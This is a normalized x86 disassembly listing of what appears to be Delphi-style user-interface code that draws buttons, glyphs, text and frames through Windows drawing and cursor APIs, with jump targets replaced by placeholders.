call sub_426d44
call sub_4224e8
push eax
push esi
push edi
push 0x0
push 0x0
mov eax ebx
call sub_4224e8
push eax
call BitBlt
mov eax [ ebp - 0x14 ]
call sub_426d44
mov eax [ eax + 0xc ]
mov edx 0xffffff
call sub_421514
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_427b14
mov eax [ ebp - 0x14 ]
call sub_426d44
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_421ce0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4036c0
mov eax [ ebp - 0x14 ]
call sub_4036c0
retn
sub_46a984
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
je r-xdata
mov dl [ ebp + 0xc ]
mov eax ebx
call sub_46a3ac
mov edi eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push 0x1
push 0x1fffffff
push 0x1fffffff
push 0x0
push 0x0
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4224e8
push eax
push edi
mov eax [ ebx + 0x8 ]
call sub_44ef40
push eax
call ImageList_DrawEx
jmp r-xdata
cmp [ ebp + 0xc ] 0x3
jne r-xdata
push 0x0
push 0x1fffffff
mov eax 0x8000000f
call sub_421054
push eax
push 0x0
push 0x0
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4224e8
push eax
push edi
mov eax [ ebx + 0x8 ]
call sub_44ef40
push eax
call ImageList_DrawEx
sub_46aa40
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_421dfc
cmp [ ebp + 0xc ] 0x1
jne r-xdata
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_4046e4
push eax
mov eax esi
call sub_4048dc
push eax
mov eax ebx
call sub_4224e8
push eax
call DrawTextA
push 0x1
push 0x1
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0x80000014
mov eax [ ebx + 0xc ]
call sub_421514
mov eax edi
or eax 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_4046e4
push eax
mov eax esi
call sub_4048dc
push eax
mov eax ebx
call sub_4224e8
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0x80000010
mov eax [ ebx + 0xc ]
call sub_421514
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_4046e4
push eax
mov eax esi
call sub_4048dc
push eax
mov eax ebx
call sub_4224e8
push eax
call DrawTextA
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_46ab20
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
and eax 0x2
cmp eax 0x2
jne r-xdata
mov edx [ ebx + 0xc ]
sub edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
sub eax [ ebx ]
lea ecx [ ebp - 0x18 ]
call sub_414b3c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_414b3c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
lea ecx [ ebp - 0x20 ]
pop edx
call sub_414b3c
jmp r-xdata
cmp [ ebp + 0x1c ] 0x1
jne r-xdata
mov [ ebp + 0x1c ] 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x40 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_414b64
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea ecx [ ebp - 0x28 ]
xor edx edx
xor eax eax
call sub_414b3c
push 0x0
lea eax [ ebp - 0x40 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
xor edx edx
xor eax eax
call sub_414b64
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x8 ]
or eax 0x400
push eax
push edi
mov eax [ ebp + 0x20 ]
call sub_4046e4
push eax
mov eax [ ebp + 0x20 ]
call sub_4048dc
push eax
mov eax [ ebp - 0x8 ]
call sub_4224e8
push eax
call DrawTextA
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
sub eax [ edi ]
lea ecx [ ebp - 0x28 ]
call sub_414b3c
jmp r-xdata
mov eax [ ebp + 0x20 ]
call sub_4046e4
test eax eax
jle r-xdata
mov [ ebp + 0x1c ] 0x0
mov eax [ ebp - 0x18 ]
mov edx eax
sub edx [ ebp - 0x20 ]
inc edx
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
sub edx [ ebp - 0x1c ]
inc edx
sar edx 0x1
jns r-xdata
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov [ esi ] edx
sub eax [ ebp - 0x28 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ esi + 0x4 ] edx
sub eax [ ebp - 0x24 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ ebp - 0x10 ] eax
adc eax 0x0
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
xor eax eax
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x18 ] 0xffffffff
jne r-xdata
mov al [ ebp + 0x1c ]
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
pop ecx
sub eax ecx
lea ecx [ ebp - 0x30 ]
call sub_414b3c
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp + 0x14 ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
add eax [ ebp - 0x28 ]
call sub_414b3c
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
call sub_414b3c
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi ] eax
add eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x24 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x28 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
add [ esi ] eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
add [ esi + 0x4 ] eax
mov edx [ ebx + 0x4 ]
add edx [ ebp - 0xc ]
mov eax [ ebp + 0x24 ]
mov eax [ eax ]
add edx eax
push edx
mov edx [ ebx ]
add edx [ ebp - 0x10 ]
mov ecx [ ebp + 0x24 ]
add edx eax
push edx
push edi
call OffsetRect
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp - 0x18 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x20 ]
mov [ esi ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec al
je r-xdata
mov [ ebp + 0x14 ] eax
adc eax 0x0
mov [ ebp + 0x14 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi + 0x4 ] eax
add eax [ ebp - 0x1c ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x1c ]
mov [ esi + 0x4 ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_46ae28
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x24 ]
mov eax [ ebp + 0x28 ]
push eax
push edi
mov al [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_46ab20
mov al [ ebp + 0x14 ]
push eax
mov al [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_46a984
mov eax [ ebp + 0x8 ]
push eax
mov al [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_46aa40
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_46ae98
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_440aa8
mov eax esi
mov edx [ r-xdata ]
call sub_403870
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_46aebc
push ebx
mov ebx eax
mov eax ebx
call sub_44e12c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x172 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x20 ]
cmp al [ edx + 0x170 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_46af08
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x20 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403870
mov eax [ eax + 0x6c ]
cmp eax [ esi + 0x168 ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_46af38
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x20 ]
call sub_46b5f8
sub_46af58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_46b684
sub_46af78
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_46a1a4
mov [ ebx + 0x16c ] eax
mov eax [ ebx + 0x16c ]
mov [ eax + 0x2c ] ebx
mov [ eax + 0x28 ] sub_46b5b8
mov ecx esi
xor edx edx
mov eax ebx
call sub_4495c8
push 0x17
push 0x16
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_441e90
mov edx 0x8000000f
mov eax ebx
call sub_441f04
mov [ ebx + 0x174 ] 0x4
mov [ ebx + 0x17c ] 0xffffffff
mov [ ebx + 0x173 ] 0x0
mov [ ebx + 0x178 ] 0x1
inc [ rw-data ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_46b038
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
dec [ rw-data ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_449624
mov eax [ esi + 0x16c ]
call sub_4036c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_46b070
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46b2a8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
cmp [ ebx + 0x182 ] 0x1
jne r-xdata
mov [ ebx + 0x182 ] 0x1
mov [ ebx + 0x171 ] 0x0
jmp r-xdata
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_422408
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_414b64
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov al [ ebx + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov esi 0x2010
mov al [ ebx + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebx + 0x182 ] 0x0
cmp [ ebx + 0x168 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x178 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xf
push eax
mov al [ ebx + 0x182 ]
add al 0xfe
sub al 0x2
setb al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_4224e8
push eax
call DrawEdge
jmp r-xdata
cmp [ ebx + 0x181 ] 0x0
je r-xdata
push esi
push 0x4
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_4224e8
push eax
call DrawFrameControl
jmp r-xdata
or esi 0x200
mov [ ebx + 0x182 ] 0x3
jmp r-xdata
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x182 ] 0x1
jne r-xdata
mov al [ ebx + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x182 ] 0x3
jne r-xdata
cmp [ ebx + 0x178 ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_421ce0
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x160 ]
call sub_422084
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x2c ]
mov eax ebx
call sub_441d64
mov eax [ ebp - 0x2c ]
push eax
mov al [ ebx + 0x173 ]
push eax
mov eax [ ebx + 0x17c ]
push eax
mov eax [ ebx + 0x174 ]
push eax
mov al [ ebx + 0x182 ]
push eax
mov al [ ebx + 0x178 ]
push eax
xor edx edx
mov eax ebx
call sub_444060
push eax
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx [ ebx + 0x160 ]
mov eax [ ebx + 0x16c ]
call sub_46ae28
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b2af
lea eax [ ebp - 0x2c ]
call sub_40442c
retn
mov edx 0x80000014
mov eax 0x8000000f
call sub_42896c
mov edx eax
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_421cb4
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x160 ]
call sub_422084
cmp [ ebx + 0x181 ] 0x0
jne r-xdata
sub_46b2b8
push ebx
push esi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_440610
cmp esi eax
sete bl
xor bl 0x1
mov [ esi + 0x181 ] bl
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax esi
call sub_442f30
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax esi
call sub_442f30
jmp r-xdata
sub_46b31c
push ebx
mov ebx eax
mov eax ebx
call sub_443e3c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov edx eax
mov eax [ ebx + 0x16c ]
call sub_46a3ac
pop ebx
retn
sub_46b348
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_443348
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
jne r-xdata
mov [ esi + 0x171 ] 0x1
mov [ esi + 0x182 ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46b3a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_443600
cmp [ ebx + 0x171 ] 0x0
je r-xdata
cmp [ ebx + 0x181 ] 0x0
jne r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_46b2b8
mov [ ebp - 0x2 ] 0x3
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
mov al [ ebp - 0x2 ]
cmp al [ ebx + 0x182 ]
je r-xdata
mov eax ebx
call sub_441768
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
mov al [ ebp - 0x2 ]
mov [ ebx + 0x182 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
test edi edi
jl r-xdata
mov eax ebx
call sub_4417ac
cmp edi eax
jg r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebp - 0x2 ] 0x2
mov [ ebp - 0x2 ] 0x3
jmp r-xdata
sub_46b440
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_4436a8
cmp [ ebx + 0x171 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ ebx + 0x171 ] 0x0
test esi esi
jl r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_441768
cmp esi eax
jge r-xdata
mov [ ebp - 0x3 ] al
cmp [ ebx + 0x168 ] 0x0
jne r-xdata
test edi edi
jl r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov [ ebx + 0x182 ] 0x0
mov [ ebx + 0x181 ] 0x0
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax ebx
call sub_4417ac
cmp edi eax
jle r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov dl [ ebx + 0x170 ]
xor dl 0x1
mov eax ebx
call sub_46b5f8
cmp [ ebx + 0x170 ] 0x0
je r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov al [ ebx + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebx + 0x182 ] 0x3
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
mov eax ebx
call sub_46b2b8
mov eax ebx
mov si 0xffeb
call sub_4038bc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
sub_46b58c
push esi
mov esi eax
test dl dl
jae r-xdata
cmp dl 0x4
jbe r-xdata
mov dl 0x1
jmp r-xdata
mov eax [ esi + 0x16c ]
cmp dl [ eax + 0x20 ]
je r-xdata
mov dl 0x4
pop esi
retn
call sub_46a384
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46b5c0
add esp 0xfffffff0
mov edx [ eax + 0x168 ]
test edx edx
je r-xdata
add esp 0x10
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov [ esp ] 0xb018
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] eax
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov eax [ eax + 0x30 ]
call sub_4452a4
sub_46b5f8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x168 ] 0x0
jne r-xdata
cmp bl [ esi + 0x170 ]
je r-xdata
xor ebx ebx
pop esi
pop ebx
retn
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov [ esi + 0x170 ] bl
test bl bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov [ esi + 0x182 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ esi + 0x182 ] 0x0
jne r-xdata
mov eax esi
call sub_46b5c0
mov [ esi + 0x182 ] 0x3
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
test bl bl
je r-xdata
sub_46b610
push ecx
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov [ esi + 0x170 ] bl
test bl bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov [ esi + 0x182 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ esi + 0x182 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_46b5c0
mov [ esi + 0x182 ] 0x3
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
test bl bl
je r-xdata
sub_46b6f0
push esi
mov esi eax
cmp dl [ esi + 0x178 ]
je r-xdata
pop esi
retn
mov [ esi + 0x178 ] dl
test dl dl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46b760
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x16c ]
call sub_46a3ac
mov eax ebx
call sub_46b2b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
sub_46b794
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x4 ]
cmp eax [ ebx + 0x168 ]
jne r-xdata
pop esi
pop ebx
retn
mov esi [ edx + 0x8 ]
cmp ebx esi
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov al [ esi + 0x172 ]
mov [ ebx + 0x172 ] al
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebx + 0x170 ] 0x0
mov [ ebx + 0x182 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_44e3c0
sub_46b804
push ebp
mov ebp esp
push 0x0
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46b88d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_441d64
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45925c
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax esi
mov si 0xffeb
call sub_4038bc
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b894
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_46b8d0
push esi
mov esi eax
mov eax esi
call sub_443aac
cmp [ esi + 0x180 ] 0x0
je r-xdata
pop esi
retn
cmp [ esi + 0x181 ] 0x0
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x5d ] 0x1
je r-xdata
call GetCapture
test eax eax
jne r-xdata
mov [ esi + 0x181 ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
sub_46b91c
push esi
mov esi eax
mov eax esi
call sub_443ac4
cmp [ esi + 0x180 ] 0x0
je r-xdata
pop esi
retn
cmp [ esi + 0x181 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x171 ] 0x0
jne r-xdata
mov [ esi + 0x181 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_46b95c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46b55c
mov ebx eax
mov edx [ esi + 0x34 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ esi + 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax ebx
call sub_426d44
mov eax [ eax + 0x14 ]
mov edx 0xff00ff
call sub_421ce0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_414b64
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_426d44
pop edx
call sub_422084
push 0x0
push edi
push 0x1
mov eax ebx
call sub_426d44
mov edx eax
xor ecx ecx
mov eax esi
call sub_44f778
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b9ec
push ebp
mov ebp esp
push ecx
push ebx
push esi
